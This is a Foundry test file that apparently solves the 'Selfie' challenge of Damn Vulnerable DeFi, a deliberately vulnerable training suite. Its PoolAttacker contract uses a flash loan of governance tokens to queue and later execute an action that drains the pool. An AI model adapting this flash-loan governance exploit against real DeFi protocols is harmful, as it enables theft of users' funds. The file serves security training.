// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        PoolAttacker attacker = new PoolAttacker(
            address(pool),
            address(governance),
            address(token),
            recovery
        );

        attacker.submitAttackProposal();

        // Fast forward time to be able to execute the proposal
        vm.warp(block.timestamp + 2 days + 1 hours);
        vm.roll(block.number + 2 days + 1 hours);

        attacker.executeAttackProposal();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(
            token.balanceOf(recovery),
            TOKENS_IN_POOL,
            "Not enough tokens in recovery account"
        );
    }
}

contract PoolAttacker is IERC3156FlashBorrower {
    error PoolAttacker_NotRequestedFlashLoan();

    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableVotes poolToken;
    address owner;
    address recoveryAddress;
    uint256 actionId;

    constructor(
        address _pool,
        address _governance,
        address _token,
        address _recoveryAddress
    ) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        poolToken = DamnValuableVotes(_token);
        recoveryAddress = _recoveryAddress;
        owner = msg.sender;
    }

    function submitAttackProposal() external {
        uint256 maxTokenFlashLoanAmount = pool.maxFlashLoan(address(poolToken));

        address target = address(pool);
        uint256 value = 0;
        bytes memory data = abi.encodeWithSelector(
            SelfiePool.emergencyExit.selector,
            recoveryAddress
        );

        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(poolToken),
            maxTokenFlashLoanAmount,
            abi.encode(target, value, data)
        );
    }

    function executeAttackProposal() external {
        governance.executeAction(actionId);
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        if (initiator != address(this)) {
            revert PoolAttacker_NotRequestedFlashLoan();
        }

        poolToken.delegate(address(this));
        (address target, uint256 value, bytes memory call_data) = abi.decode(
            data,
            (address, uint256, bytes)
        );

        actionId = governance.queueAction(target, uint128(value), call_data);

        bool result = IERC20(token).approve(msg.sender, amount + fee);
        if (!result) {
            revert("Token approval failed");
        }

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
